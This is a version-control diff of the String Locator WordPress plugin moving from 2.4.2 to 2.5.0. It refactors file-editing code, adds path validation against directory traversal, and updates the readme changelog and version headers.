  |  | 506 | $editor['version'], |
  |  | 507 | true |
  |  | 508 | ); |
  | 881 | 509 |  |
  | 882 | 510 | wp\_localize\_script( |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L887) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L515) |  |
  | 887 | 515 | 'goto\_line'    => absint( $\_GET['string-locator-line'] ), |
  | 888 | 516 | 'goto\_linepos' => absint( $\_GET['string-locator-linepos'] ), |
  | 889 |  | 'save\_url'     => get\_rest\_url( null, 'string-locator/v1/save' ), |
  |  | 517 | 'url'          => array( |
  |  | 518 | 'save' => get\_rest\_url( null, 'string-locator/v1/save' ), |
  |  | 519 | ), |
  | 890 | 520 | ) |
  | 891 | 521 | ); |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L939) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L569) |  |
  | 939 | 569 | return false; |
  | 940 | 570 | } |
  |  | 571 |  |
  |  | 572 | $include\_path = ''; |
  | 941 | 573 |  |
  | 942 | 574 | /\*\* |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L947) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L579) |  |
  | 947 | 579 | \* - The user is capable of editing files. |
  | 948 | 580 | \*/ |
  | 949 |  | if ( isset( $\_GET['string-locator-path'] ) && ~~$this->~~is\_valid\_location( $\_GET['string-locator-path'] ) && current\_user\_can( 'edit\_themes' ) ) { |
  | 950 |  | ~~include\_once( dirname( \_\_FILE\_\_ ) . '/../editor.php' )~~; |
  |  | 581 | if ( isset( $\_GET['string-locator-path'] ) && self::is\_valid\_location( $\_GET['string-locator-path'] ) && current\_user\_can( 'edit\_themes' ) ) { |
  |  | 582 | $include\_path = trailingslashit( STRING\_LOCATOR\_PLUGIN\_DIR ) . 'views/editor.php'; |
  | 951 | 583 | } else { |
  | 952 |  | include\_once( dirname( \_\_FILE\_\_ ) . '/../search.php' ); |
  |  | 584 | $include\_path = trailingslashit( STRING\_LOCATOR\_PLUGIN\_DIR ) . 'views/search.php'; |
  |  | 585 | } |
  |  | 586 |  |
  |  | 587 | $include\_path = apply\_filters( 'string\_locator\_view', $include\_path ); |
  |  | 588 |  |
  |  | 589 | if ( ! empty( $include\_path ) ) { |
  |  | 590 | include\_once $include\_path; |
  | 953 | 591 | } |
  | 954 | 592 | } |
  | 955 | 593 |  |
  | 956 | 594 | function admin\_body\_class( $class ) { |
  | 957 |  | if ( isset( $\_GET['string-locator-path'] ) && ~~$this->~~is\_valid\_location( $\_GET['string-locator-path'] ) && current\_user\_can( 'edit\_themes' ) ) { |
  |  | 595 | if ( isset( $\_GET['string-locator-path'] ) && self::is\_valid\_location( $\_GET['string-locator-path'] ) && current\_user\_can( 'edit\_themes' ) ) { |
  | 958 | 596 | $class .= ' file-edit-screen'; |
  | 959 | 597 | } |
  | 960 | 598 |  |
  | 961 | 599 | return $class; |
  | 962 |  | ~~}~~ |
  | 963 |  |  |
  | 964 |  | ~~/\*\*~~ |
  | 965 |  | ~~\* Check for inconsistencies in brackets and similar.~~ |
  | 966 |  | ~~\*~~ |
  | 967 |  | ~~\* @param string $start Start delimited.~~ |
  | 968 |  | ~~\* @param string $end End delimiter.~~ |
  | 969 |  | ~~\* @param string $string The string to scan.~~ |
  | 970 |  | ~~\*~~ |
  | 971 |  | ~~\* @return array~~ |
  | 972 |  | ~~\*/~~ |
  | 973 |  | ~~function smart\_scan( $start, $end, $string ) {~~ |
  | 974 |  | ~~$opened = array();~~ |
  | 975 |  |  |
  | 976 |  | ~~$lines = explode( "\n", $string );~~ |
  | 977 |  | ~~for ( $i = 0; $i < count( $lines ); $i ++ ) {~~ |
  | 978 |  | ~~if ( stristr( $lines[ $i ], $start ) ) {~~ |
  | 979 |  | ~~$opened[] = $i;~~ |
  | 980 |  | ~~}~~ |
  | 981 |  | ~~if ( stristr( $lines[ $i ], $end ) ) {~~ |
  | 982 |  | ~~array\_pop( $opened );~~ |
  | 983 |  | ~~}~~ |
  | 984 |  | ~~}~~ |
  | 985 |  |  |
  | 986 |  | ~~return $opened;~~ |
  | 987 |  | ~~}~~ |
  | 988 |  |  |
  | 989 |  | ~~/\*\*~~ |
  | 990 |  | ~~\* Handler for storing the content of the code editor.~~ |
  | 991 |  | ~~\*~~ |
  | 992 |  | ~~\* Also runs over the Smart-Scan if enabled.~~ |
  | 993 |  | ~~\*~~ |
  | 994 |  | ~~\* @return void|array~~ |
  | 995 |  | ~~\*/~~ |
  | 996 |  | ~~function editor\_save( $request ) {~~ |
  | 997 |  | ~~$\_POST = $request->get\_params();~~ |
  | 998 |  |  |
  | 999 |  | ~~$check\_loopback = isset( $\_POST['string-locator-loopback-check'] );~~ |
  | 1000 |  | ~~$do\_smart\_scan  = isset( $\_POST['string-locator-smart-edit'] );~~ |
  | 1001 |  |  |
  | 1002 |  | ~~if ( $this->is\_valid\_location( $\_POST['string-locator-path'] ) ) {~~ |
  | 1003 |  | ~~$path    = urldecode( $\_POST['string-locator-path'] );~~ |
  | 1004 |  | ~~$content = stripslashes( $\_POST['string-locator-editor-content'] );~~ |
  | 1005 |  |  |
  | 1006 |  | ~~/\*\*~~ |
  | 1007 |  | ~~\* Send an error notice if the file isn't writable~~ |
  | 1008 |  | ~~\*/~~ |
  | 1009 |  | ~~if ( ! is\_writeable( $path ) ) {~~ |
  | 1010 |  | ~~$this->notice[] = array(~~ |
  | 1011 |  | ~~'type'    => 'error',~~ |
  | 1012 |  | ~~'message' => \_\_( 'The file could not be written to, please check file permissions or edit it manually.', 'string-locator' ),~~ |
  | 1013 |  | ~~);~~ |
  | 1014 |  |  |
  | 1015 |  | ~~return array(~~ |
  | 1016 |  | ~~'notices' => $this->notice,~~ |
  | 1017 |  | ~~);~~ |
  | 1018 |  | ~~}~~ |
  | 1019 |  |  |
  | 1020 |  | ~~/\*\*~~ |
  | 1021 |  | ~~\* If enabled, run the Smart-Scan on the content before saving it~~ |
  | 1022 |  | ~~\*/~~ |
  | 1023 |  | ~~if ( $do\_smart\_scan ) {~~ |
  | 1024 |  | ~~$open\_brace  = substr\_count( $content, '{' );~~ |
  | 1025 |  | ~~$close\_brace = substr\_count( $content, '}' );~~ |
  | 1026 |  | ~~if ( $open\_brace !== $close\_brace ) {~~ |
  | 1027 |  | ~~$this->failed\_edit = true;~~ |
  | 1028 |  |  |
  | 1029 |  | ~~$opened = $this->smart\_scan( '{', '}', $content );~~ |
  | 1030 |  |  |
  | 1031 |  | ~~foreach ( $opened as $line ) {~~ |
  | 1032 |  | ~~$this->notice[] = array(~~ |
  | 1033 |  | ~~'type'    => 'error',~~ |
  | 1034 |  | ~~'message' => sprintf(~~ |
  | 1035 |  | ~~// translators: 1: Line number with an error.~~ |
  | 1036 |  | ~~\_\_( 'There is an inconsistency in the opening and closing braces, { and }, of your file on line %s', 'string-locator' ),~~ |
  | 1037 |  | ~~'<a href="#" class="string-locator-edit-goto" data-goto-line="' . ( $line + 1 ) . '">' . ( $line + 1 ) . '</a>'~~ |
  | 1038 |  | ~~),~~ |
  | 1039 |  | ~~);~~ |
  | 1040 |  | ~~}~~ |
  | 1041 |  | ~~}~~ |
  | 1042 |  |  |
  | 1043 |  | ~~$open\_bracket  = substr\_count( $content, '[' );~~ |
  | 1044 |  | ~~$close\_bracket = substr\_count( $content, ']' );~~ |
  | 1045 |  | ~~if ( $open\_bracket !== $close\_bracket ) {~~ |
  | 1046 |  | ~~$this->failed\_edit = true;~~ |
  | 1047 |  |  |
  | 1048 |  | ~~$opened = $this->smart\_scan( '[', ']', $content );~~ |
  | 1049 |  |  |
  | 1050 |  | ~~foreach ( $opened as $line ) {~~ |
  | 1051 |  | ~~$this->notice[] = array(~~ |
  | 1052 |  | ~~'type'    => 'error',~~ |
  | 1053 |  | ~~'message' => sprintf(~~ |
  | 1054 |  | ~~// translators: 1: Line number with an error.~~ |
  | 1055 |  | ~~\_\_( 'There is an inconsistency in the opening and closing braces, [ and ], of your file on line %s', 'string-locator' ),~~ |
  | 1056 |  | ~~'<a href="#" class="string-locator-edit-goto" data-goto-line="' . ( $line + 1 ) . '">' . ( $line + 1 ) . '</a>'~~ |
  | 1057 |  | ~~),~~ |
  | 1058 |  | ~~);~~ |
  | 1059 |  | ~~}~~ |
  | 1060 |  | ~~}~~ |
  | 1061 |  |  |
  | 1062 |  | ~~$open\_parenthesis  = substr\_count( $content, '(' );~~ |
  | 1063 |  | ~~$close\_parenthesis = substr\_count( $content, ')' );~~ |
  | 1064 |  | ~~if ( $open\_parenthesis !== $close\_parenthesis ) {~~ |
  | 1065 |  | ~~$this->failed\_edit = true;~~ |
  | 1066 |  |  |
  | 1067 |  | ~~$opened = $this->smart\_scan( '(', ')', $content );~~ |
  | 1068 |  |  |
  | 1069 |  | ~~foreach ( $opened as $line ) {~~ |
  | 1070 |  | ~~$this->notice[] = array(~~ |
  | 1071 |  | ~~'type'    => 'error',~~ |
  | 1072 |  | ~~'message' => sprintf(~~ |
  | 1073 |  | ~~// translators: 1: Line number with an error.~~ |
  | 1074 |  | ~~\_\_( 'There is an inconsistency in the opening and closing braces, ( and ), of your file on line %s', 'string-locator' ),~~ |
  | 1075 |  | ~~'<a href="#" class="string-locator-edit-goto" data-goto-line="' . ( $line + 1 ) . '">' . ( $line + 1 ) . '</a>'~~ |
  | 1076 |  | ~~),~~ |
  | 1077 |  | ~~);~~ |
  | 1078 |  | ~~}~~ |
  | 1079 |  | ~~}~~ |
  | 1080 |  |  |
  | 1081 |  | ~~if ( $this->failed\_edit ) {~~ |
  | 1082 |  | ~~return array(~~ |
  | 1083 |  | ~~'notices' => $this->notice,~~ |
  | 1084 |  | ~~);~~ |
  | 1085 |  | ~~}~~ |
  | 1086 |  | ~~}~~ |
  | 1087 |  |  |
  | 1088 |  | ~~$original = file\_get\_contents( $path );~~ |
  | 1089 |  |  |
  | 1090 |  | ~~$this->write\_file( $path, $content );~~ |
  | 1091 |  |  |
  | 1092 |  | ~~/\*\*~~ |
  | 1093 |  | ~~\* Check the status of the site after making our edits.~~ |
  | 1094 |  | ~~\* If the site fails, revert the changes to return the sites to its original state~~ |
  | 1095 |  | ~~\*/~~ |
  | 1096 |  | ~~if ( $check\_loopback ) {~~ |
  | 1097 |  | ~~$header = wp\_remote\_head( site\_url() );~~ |
  | 1098 |  |  |
  | 1099 |  | ~~if ( ! is\_wp\_error( $header ) && 301 === (int) $header['response']['code'] ) {~~ |
  | 1100 |  | ~~$header = wp\_remote\_head( $header['headers']['location'] );~~ |
  | 1101 |  | ~~}~~ |
  | 1102 |  |  |
  | 1103 |  | ~~$bad\_http\_check = apply\_filters( 'string\_locator\_bad\_http\_codes', $this->bad\_http\_codes );~~ |
  | 1104 |  | ~~}~~ |
  | 1105 |  |  |
  | 1106 |  | ~~if ( $check\_loopback && is\_wp\_error( $header ) ) {~~ |
  | 1107 |  | ~~$this->failed\_edit = true;~~ |
  | 1108 |  | ~~$this->write\_file( $path, $original );~~ |
  | 1109 |  |  |
  | 1110 |  | ~~// Likely loopback error, so be useful in our errors.~~ |
  | 1111 |  | ~~if ( 'http\_request\_failed' === $header->get\_error\_code() ) {~~ |
  | 1112 |  | ~~return array(~~ |
  | 1113 |  | ~~'notices' => array(~~ |
  | 1114 |  | ~~array(~~ |
  | 1115 |  | ~~'type'    => 'error',~~ |
  | 1116 |  | ~~'message' => \_\_( 'Your changes were not saved, as a check of your site could not be completed afterwards. This may be due to a <a href="https://wordpress.org/support/article/loopbacks/">loopback</a> error.', 'string-locator' ),~~ |
  | 1117 |  | ~~),~~ |
  | 1118 |  | ~~),~~ |
  | 1119 |  | ~~);~~ |
  | 1120 |  | ~~}~~ |
  | 1121 |  |  |
  | 1122 |  | ~~// Fallback error message here.~~ |
  | 1123 |  | ~~return array(~~ |
  | 1124 |  | ~~'notices' => array(~~ |
  | 1125 |  | ~~array(~~ |
  | 1126 |  | ~~'type'    => 'error',~~ |
  | 1127 |  | ~~'message' => $header->get\_error\_message(),~~ |
  | 1128 |  | ~~),~~ |
  | 1129 |  | ~~),~~ |
  | 1130 |  | ~~);~~ |
  | 1131 |  | ~~} elseif ( $check\_loopback && in\_array( $header['response']['code'], $bad\_http\_check, true ) ) {~~ |
  | 1132 |  | ~~$this->failed\_edit = true;~~ |
  | 1133 |  | ~~$this->write\_file( $path, $original );~~ |
  | 1134 |  |  |
  | 1135 |  | ~~return array(~~ |
  | 1136 |  | ~~'notices' => array(~~ |
  | 1137 |  | ~~array(~~ |
  | 1138 |  | ~~'type'    => 'error',~~ |
  | 1139 |  | ~~'message' => \_\_( 'A 500 server error was detected on your site after updating your file. We have restored the previous version of the file for you.', 'string-locator' ),~~ |
  | 1140 |  | ~~),~~ |
  | 1141 |  | ~~),~~ |
  | 1142 |  | ~~);~~ |
  | 1143 |  | ~~} else {~~ |
  | 1144 |  | ~~return array(~~ |
  | 1145 |  | ~~'notices' => array(~~ |
  | 1146 |  | ~~array(~~ |
  | 1147 |  | ~~'type'    => 'success',~~ |
  | 1148 |  | ~~'message' => \_\_( 'The file has been saved', 'string-locator' ),~~ |
  | 1149 |  | ~~),~~ |
  | 1150 |  | ~~),~~ |
  | 1151 |  | ~~);~~ |
  | 1152 |  | ~~}~~ |
  | 1153 |  | ~~} else {~~ |
  | 1154 |  | ~~return array(~~ |
  | 1155 |  | ~~'notices' => array(~~ |
  | 1156 |  | ~~array(~~ |
  | 1157 |  | ~~'type'    => 'error',~~ |
  | 1158 |  | ~~'message' => sprintf(~~ |
  | 1159 |  | ~~// translators: %s: The file location that was sent.~~ |
  | 1160 |  | ~~\_\_( 'The file location provided, <strong>%s</strong>, is not valid.', 'string-locator' ),~~ |
  | 1161 |  | ~~$\_POST['string-locator-path']~~ |
  | 1162 |  | ~~),~~ |
  | 1163 |  | ~~),~~ |
  | 1164 |  | ~~),~~ |
  | 1165 |  | ~~);~~ |
  | 1166 |  | ~~}~~ |
  | 1167 |  | ~~}~~ |
  | 1168 |  |  |
  | 1169 |  | ~~/\*\*~~ |
  | 1170 |  | ~~\* When editing a file, this is where we write all the new content.~~ |
  | 1171 |  | ~~\* We will break early if the user isn't allowed to edit files.~~ |
  | 1172 |  | ~~\*~~ |
  | 1173 |  | ~~\* @param string $path The path to the file.~~ |
  | 1174 |  | ~~\* @param string $content The content to write to the file.~~ |
  | 1175 |  | ~~\*~~ |
  | 1176 |  | ~~\* @return void~~ |
  | 1177 |  | ~~\*/~~ |
  | 1178 |  | ~~private function write\_file( $path, $content ) {~~ |
  | 1179 |  | ~~if ( ! current\_user\_can( 'edit\_themes' ) ) {~~ |
  | 1180 |  | ~~return;~~ |
  | 1181 |  | ~~}~~ |
  | 1182 |  |  |
  | 1183 |  | ~~// Verify the location is valid before we try using it.~~ |
  | 1184 |  | ~~if ( ! $this->is\_valid\_location( $path ) ) {~~ |
  | 1185 |  | ~~return;~~ |
  | 1186 |  | ~~}~~ |
  | 1187 |  |  |
  | 1188 |  | ~~$back\_compat\_filter = apply\_filters( 'string-locator-filter-closing-php-tags', true ); // phpcs:ignore WordPress.NamingConventions.ValidHookName.UseUnderscores~~ |
  | 1189 |  |  |
  | 1190 |  | ~~if ( apply\_filters( 'string\_locator\_filter\_closing\_php\_tags', $back\_compat\_filter ) ) {~~ |
  | 1191 |  | ~~$content = preg\_replace( '/\?>$/si', '', trim( $content ), - 1, $replaced\_strings );~~ |
  | 1192 |  |  |
  | 1193 |  | ~~if ( $replaced\_strings >= 1 ) {~~ |
  | 1194 |  | ~~$this->notice[] = array(~~ |
  | 1195 |  | ~~'type'    => 'error',~~ |
  | 1196 |  | ~~'message' => \_\_( 'We detected a PHP code tag ending, this has been automatically stripped out to help prevent errors in your code.', 'string-locator' ),~~ |
  | 1197 |  | ~~);~~ |
  | 1198 |  | ~~}~~ |
  | 1199 |  | ~~}~~ |
  | 1200 |  |  |
  | 1201 |  | ~~$file        = fopen( $path, 'w' );~~ |
  | 1202 |  | ~~$lines       = explode( "\n", str\_replace( array( "\r\n", "\r" ), "\n", $content ) );~~ |
  | 1203 |  | ~~$total\_lines = count( $lines );~~ |
  | 1204 |  |  |
  | 1205 |  | ~~for ( $i = 0; $i < $total\_lines; $i ++ ) {~~ |
  | 1206 |  | ~~$write\_line = $lines[ $i ];~~ |
  | 1207 |  |  |
  | 1208 |  | ~~if ( ( $i + 1 ) < $total\_lines ) {~~ |
  | 1209 |  | ~~$write\_line .= PHP\_EOL;~~ |
  | 1210 |  | ~~}~~ |
  | 1211 |  |  |
  | 1212 |  | ~~fwrite( $file, $write\_line );~~ |
  | 1213 |  | ~~}~~ |
  | 1214 |  |  |
  | 1215 |  | ~~fclose( $file );~~ |
  | 1216 | 600 | } |
  | 1217 | 601 |  |
  | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2432238#L1234) | […](/browser/string-locator/trunk/includes/class-string-locator.php?rev=2685592#L618) |  |
  | 1234 | 618 |  |
  | 1235 | 619 | /\*\* |
  | 1236 |  | \* Scan through an individual file to look for occurrences of £string. |
  | 1237 |  | \* |
  | 1238 |  | \* @param string $filename The path to the file. |
  | 1239 |  | \* @param string $string The search string. |
  | 1240 |  | \* @param mixed $location The file location object/string. |
  | 1241 |  | \* @param string $type File type. |
  | 1242 |  | \* @param string $slug The plugin/theme slug of the file. |
  | 1243 |  | \* @param boolean $regex Should a regex search be performed. |
  | 1244 |  | \* |
  | 1245 |  | \* @return array |
  | 1246 |  | \*/ |
  | 1247 |  | function scan\_file( $filename, $string, $location, $type, $slug, $regex = false ) { |
  | 1248 |  | if ( empty( $string ) || ! is\_file( $filename ) ) { |
  | 1249 |  | return array(); |
  | 1250 |  | } |
  | 1251 |  | $output      = array(); |
  | 1252 |  | $linenum     = 0; |
  | 1253 |  | $match\_count = 0; |
  | 1254 |  |  |
  | 1255 |  | if ( ! is\_object( $location ) ) { |
  | 1256 |  | $path     = $location; |
  | 1257 |  | $location = explode( DIRECTORY\_SEPARATOR, $location ); |
  | 1258 |  | $file     = end( $location ); |
  | 1259 |  | } else { |
  | 1260 |  | $path = $location->getPathname(); |
  | 1261 |  | $file = $location->getFilename(); |
  | 1262 |  | } |
  | 1263 |  |  |
  | 1264 |  | /\* |
  | 1265 |  | \* Check if the filename matches our search pattern |
  | 1266 |  | \*/ |
  | 1267 |  | if ( stristr( $file, $string ) || ( $regex && preg\_match( $string, $file ) ) ) { |
  | 1268 |  | $relativepath = str\_replace( |
  | 1269 |  | array( |
  | 1270 |  | ABSPATH, |
  | 1271 |  | '\\', |
  | 1272 |  | '/', |
  | 1273 |  | ), |
  | 1274 |  | array( |
  | 1275 |  | '', |
  | 1276 |  | DIRECTORY\_SEPARATOR, |
  | 1277 |  | DIRECTORY\_SEPARATOR, |
  | 1278 |  | ), |
  | 1279 |  | $path |
  | 1280 |  | ); |
  | 1281 |  | $match\_count ++; |
  | 1282 |  |  |
  | 1283 |  | $editurl = $this->create\_edit\_link( $path, $linenum ); |
  | 1284 |  |  |
  | 1285 |  | $path\_string = sprintf( |
  | 1286 |  | '<a href="%s">%s</a>', |
  | 1287 |  | esc\_url( $editurl ), |
  | 1288 |  | esc\_html( $relativepath ) |
  | 1289 |  | ); |
  | 1290 |  |  |
  | 1291 |  | $output[] = array( |
  | 1292 |  | 'ID'           => $match\_count, |
  | 1293 |  | 'linenum'      => sprintf( |
  | 1294 |  | '[%s]', |
  | 1295 |  | esc\_html\_\_( 'Filename matches search', 'string-locator' ) |
  | 1296 |  | ), |
  | 1297 |  | 'linepos'      => '', |
  | 1298 |  | 'path'         => $path, |
  | 1299 |  | 'filename'     => $path\_string, |
  | 1300 |  | 'filename\_raw' => $relativepath, |
  | 1301 |  | 'editurl'      => ( current\_user\_can( 'edit\_themes' ) ? $editurl : false ), |
  | 1302 |  | 'stringresult' => $file, |
  | 1303 |  | ); |
  | 1304 |  | } |
  | 1305 |  |  |
  | 1306 |  | $readfile = @fopen( $filename, 'r' ); |
  | 1307 |  | if ( $readfile ) { |
  | 1308 |  | while ( ( $readline = fgets( $readfile ) ) !== false ) { // phpcs:ignore WordPress.CodeAnalysis.AssignmentInCondition.FoundInWhileCondition |
  | 1309 |  | $string\_preview\_is\_cut = false; |
  | 1310 |  | $linenum ++; |
  | 1311 |  | /\*\* |
  | 1312 |  | \* If our string is found in this line, output the line number and other data |
  | 1313 |  | \*/ |
  | 1314 |  | if ( ( ! $regex && stristr( $readline, $string ) ) || ( $regex && preg\_match( $string, $readline, $match, PREG\_OFFSET\_CAPTURE ) ) ) { |
  | 1315 |  | /\*\* |
  | 1316 |  | \* Prepare the visual path for the end user |
  | 1317 |  | \* Removes path leading up to WordPress root and ensures consistent directory separators |
  | 1318 |  | \*/ |
  | 1319 |  | $relativepath = str\_replace( |
  | 1320 |  | array( |
  | 1321 |  | ABSPATH, |
  | 1322 |  | '\\', |
  | 1323 |  | '/', |
  | 1324 |  | ), |
  | 1325 |  | array( |
  | 1326 |  | '', |
  | 1327 |  | DIRECTORY\_SEPARATOR, |
  | 1328 |  | DIRECTORY\_SEPARATOR, |
  | 1329 |  | ), |
  | 1330 |  | $path |
  | 1331 |  | ); |
  | 1332 |  | $match\_count ++; |
  | 1333 |  |  |
  | 1334 |  | if ( $regex ) { |
  | 1335 |  | $str\_pos = $match[0][1]; |
  | 1336 |  | } else { |
  | 1337 |  | $str\_pos = stripos( $readline, $string ); |
  | 1338 |  | } |
  | 1339 |  |  |
  | 1340 |  | /\*\* |
  | 1341 |  | \* Create the URL to take the user to the editor |
  | 1342 |  | \*/ |
  | 1343 |  | $editurl = $this->create\_edit\_link( $path, $linenum, $str\_pos ); |
  | 1344 |  |  |
  | 1345 |  | $string\_preview = $readline; |
  | 1346 |  | if ( strlen( $string\_preview ) > ( strlen( $string ) + $this->excerpt\_length ) ) { |
  | 1347 |  | $string\_location = strpos( $string\_preview, $string ); |
  | 1348 |  |  |
  | 1349 |  | $string\_location\_start = $string\_location - $this->excerpt\_length; |
  | 1350 |  | if ( $string\_location\_start < 0 ) { |
  | 1351 |  | $string\_location\_start = 0; |
  | 1352 |  | } |
  | 1353 |  |  |
  | 1354 |  | $string\_location\_end = ( strlen( $string ) + ( $this->excerpt\_length \* 2 ) ); |
  | 1355 |  | if ( $string\_location\_end > strlen( $string\_preview ) ) { |
  | 1356 |  | $string\_location\_end = strlen( $string\_preview ); |
  | 1357 |  | } |
  | 1358 |  |  |
  | 1359 |  | $string\_preview        = substr( $string\_preview, $string\_location\_start, $string\_location\_end ); |
  | 1360 |  | $string\_preview\_is\_cut = true; |
  | 1361 |  | } |
  | 1362 |  |  |
  | 1363 |  | if ( $regex ) { |
  | 1364 |  | $string\_preview = preg\_replace( preg\_replace( '/\/(.+)\//', '/($1)/', $string ), '<strong>$1</strong>', esc\_html( $string\_preview ) ); |
  | 1365 |  | } else { |
  | 1366 |  | $string\_preview = preg\_replace( '/(' . $string . ')/i', '<strong>$1</strong>', esc\_html( $string\_preview ) ); |
  | 1367 |  | } |
  | 1368 |  | if ( $string\_preview\_is\_cut ) { |
  | 1369 |  | $string\_preview = sprintf( |
  | 1370 |  | '&hellip;%s&hellip;', |
  | 1371 |  | $string\_preview |
  | 1372 |  | ); |
  | 1373 |  | } |
  | 1374 |  |  |
  | 1375 |  | $path\_string = sprintf( |
  | 1376 |  | '<a href="%s">%s</a>', |
  | 1377 |  | esc\_url( $editurl ), |
  | 1378 |  | esc\_html( $relativepath ) |
  | 1379 |  | ); |
  | 1380 |  |  |
  | 1381 |  | $output[] = array( |
  | 1382 |  | 'ID'           => $match\_count, |
  | 1383 |  | 'linenum'      => $linenum, |
  | 1384 |  | 'linepos'      => $str\_pos, |
  | 1385 |  | 'path'         => $path, |
  | 1386 |  | 'filename'     => $path\_string, |
  | 1387 |  | 'filename\_raw' => $relativepath, |
  | 1388 |  | 'editurl'      => ( current\_user\_can( 'edit\_themes' ) ? $editurl : false ), |
  | 1389 |  | 'stringresult' => $string\_preview, |
  | 1390 |  | ); |
  | 1391 |  | } |
  | 1392 |  | } |
  | 1393 |  |  |
  | 1394 |  | fclose( $readfile ); |
  | 1395 |  | } else { |
  | 1396 |  | /\*\* |
  | 1397 |  | \* The file was unreadable, give the user a friendly notification |
  | 1398 |  | \*/ |
  | 1399 |  | $output[] = array( |
  | 1400 |  | 'linenum'      => '#', |
  | 1401 |  | // translators: 1: Filename. |
  | 1402 |  | 'filename'     => esc\_html( sprintf( \_\_( 'Could not read file: %s', 'string-locator' ), $filename ) ), |
  | 1403 |  | 'stringresult' => '', |
  | 1404 |  | ); |
  | 1405 |  | } |
  | 1406 |  |  |
  | 1407 |  | return $output; |
  | 1408 |  | } |
  | 1409 |  |  |
  | 1410 |  | function ajax\_scan\_path( $path ) { |
  | 1411 |  | $files = array(); |
  | 1412 |  |  |
  | 1413 |  | $paths = new RecursiveIteratorIterator( |
  | 1414 |  | new RecursiveDirectoryIterator( $path ), |
  | 1415 |  | RecursiveIteratorIterator::SELF\_FIRST |
  | 1416 |  | ); |
  | 1417 |  |  |
  | 1418 |  | foreach ( $paths as $name => $location ) { |
  | 1419 |  | if ( is\_dir( $location->getPathname() ) ) { |
  | 1420 |  | continue; |
  | 1421 |  | } |
  | 1422 |  |  |
  | 1423 |  | $files[] = $location->getPathname(); |
  | 1424 |  | } |
  | 1425 |  |  |
  | 1426 |  | return $files; |
  |  | 620 | \* Check if a file path is valid for editing. |
  |  | 621 | \* |
  |  | 622 | \* @param string $path Path to file. |
  |  | 623 | \* |
  |  | 624 | \* @return bool |
  |  | 625 | \*/ |
  |  | 626 | public static function is\_valid\_location( $path ) { |
  |  | 627 | $valid   = true; |
  |  | 628 | $path    = str\_replace( array( '/' ), array( DIRECTORY\_SEPARATOR ), stripslashes( $path ) ); |
  |  | 629 | $abspath = str\_replace( array( '/' ), array( DIRECTORY\_SEPARATOR ), ABSPATH ); |
  |  | 630 |  |
  |  | 631 | // Check that it is a valid file we are trying to access as well. |
  |  | 632 | if ( ! file\_exists( $path ) ) { |
  |  | 633 | $valid = false; |
  |  | 634 | } |
  |  | 635 |  |
  |  | 636 | if ( empty( $path ) ) { |
  |  | 637 | $valid = false; |
  |  | 638 | } |
  |  | 639 | if ( stristr( $path, '..' ) ) { |
  |  | 640 | $valid = false; |
  |  | 641 | } |
  |  | 642 | if ( ! stristr( $path, $abspath ) ) { |
  |  | 643 | $valid = false; |
  |  | 644 | } |
  |  | 645 |  |
  |  | 646 | return $valid; |
  | 1427 | 647 | } |
  | 1428 | 648 | } |
* ## [string-locator/trunk/readme.txt](/changeset/2685592/string-locator/trunk/readme.txt "Show the changeset 2685592 restricted to string-locator/trunk/readme.txt")

  | [r2566661](/browser/string-locator/trunk/readme.txt?rev=2566661#L6 "Show revision 2566661 of this file in browser") | [r2685592](/browser/string-locator/trunk/readme.txt?rev=2685592#L6 "Show revision 2685592 of this file in browser") |  |
  | --- | --- | --- |
  | 6 | 6 | Tags: text, search, find, syntax, highlight |
  | 7 | 7 | Requires at least: 4.9 |
  | 8 |  | Tested up to: 5.~~8~~ |
  | 9 |  | Stable tag: 2.~~4.2~~ |
  |  | 8 | Tested up to: 5.9 |
  |  | 9 | Stable tag: 2.5.0 |
  | 10 | 10 | License: GPLv2 or later |
  | 11 | 11 | License URI: http://www.gnu.org/licenses/gpl-2.0.html |
  | […](/browser/string-locator/trunk/readme.txt?rev=2566661#L46) | […](/browser/string-locator/trunk/readme.txt?rev=2685592#L46) |  |
  | 46 | 46 | == Changelog == |
  | 47 | 47 |  |
  | 48 |  | = 2.4.2 = |
  | 49 |  | \* Fixed the option to restore previous search. |
  | 50 |  | \* Fixed respecting text capitalization in previews when doing a non-regex search. |
  | 51 |  | \* Changed capability checks, now works on hosts that maintain updates for their users. |
  |  | 48 | = 2.5.0 (2022-02-27) = |
  |  | 49 | \* Fixed a bug where content would have slashes stripped unexpectedly. |
  |  | 50 | \* Improved table spacing on search results. |
  |  | 51 | \* Improved loopback checks to also check admin access. |
  |  | 52 | \* Hardened the search iterator so users can't accidentally perform unexpected directory traversal. |
  |  | 53 | \* Introduced actions and filters in various places to enable extenders, and future enhancements. |
  |  | 54 | \* Moved all ajax requests to dedicated REST endpoints. |
  |  | 55 | \* Refactored file structure. |
  | 52 | 56 |  |
  | 53 | 57 | = Older entries = |
* ## [string-locator/trunk/string-locator.php](/changeset/2685592/string-locator/trunk/string-locator.php "Show the changeset 2685592 restricted to string-locator/trunk/string-locator.php")

  | [r2432238](/browser/string-locator/trunk/string-locator.php?rev=2432238#L4 "Show revision 2432238 of this file in browser") | [r2685592](/browser/string-locator/trunk/string-locator.php?rev=2685592#L4 "Show revision 2685592 of this file in browser") |  |
  | --- | --- | --- |
  | 4 | 4 | \* Plugin URI: http://www.clorith.net/wordpress-string-locator/ |
  | 5 | 5 | \* Description: Scan through theme and plugin files looking for text strings |
  | 6 |  | \* Version: 2.~~4.2~~ |
  |  | 6 | \* Version: 2.5.0 |
  | 7 | 7 | \* Author: Clorith |
  | 8 | 8 | \* Author URI: http://www.clorith.net |
  | […](/browser/string-locator/trunk/string-locator.php?rev=2432238#L26) | […](/browser/string-locator/trunk/string-locator.php?rev=2685592#L26) |  |
  | 26 | 26 | \*/ |
  | 27 | 27 |  |
  |  | 28 | namespace JITS\StringLocator; |
  |  | 29 |  |
  | 28 | 30 | if ( ! defined( 'ABSPATH' ) ) { |
  | 29 | 31 | die(); |
  | […](/browser/string-locator/trunk/string-locator.php?rev=2432238#L33) | […](/browser/string-locator/trunk/string-locator.php?rev=2685592#L35) |  |
  | 33 | 35 | define( 'STRING\_LOCATOR\_PLUGIN\_DIR', plugin\_dir\_path( \_\_FILE\_\_ ) ); |
  | 34 | 36 |  |
